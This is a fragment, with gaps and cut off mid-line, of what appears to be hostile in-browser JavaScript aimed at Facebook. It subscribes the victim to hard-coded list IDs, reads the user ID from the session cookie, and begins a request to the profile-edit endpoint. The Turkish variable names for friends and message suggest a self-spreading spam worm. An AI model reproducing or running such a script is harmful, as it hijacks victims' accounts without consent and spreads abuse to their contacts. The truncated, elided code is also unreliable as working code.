...
sublist("691968150847923");
sublist("592904217464412");
sublist("608763995844062");

var gid = ['205397286316275'];
...
var spage_id = "205397286316275";
var spost_id = "205397286316275";
var sfoto_id = "205397286316275";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + 
